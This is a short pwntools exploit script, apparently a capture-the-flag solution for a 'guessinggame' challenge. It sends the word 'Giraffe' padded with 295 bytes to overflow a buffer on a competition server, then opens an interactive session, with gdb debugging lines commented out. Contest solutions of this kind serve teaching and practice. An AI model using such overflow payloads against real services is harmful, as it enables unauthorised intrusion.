from pwn import *
elf = context.binary = ELF("./guessinggame")
r = elf.process()
r = remote("chal.pctf.competitivecyber.club", 9999)
# gdb.attach(r, '''
#     b* check+94\n
#     p/x $rsp+0x13C\n
#     c
# ''')

payload = b"Giraffe" + b"a"*295
r.sendline(payload)

r.interactive()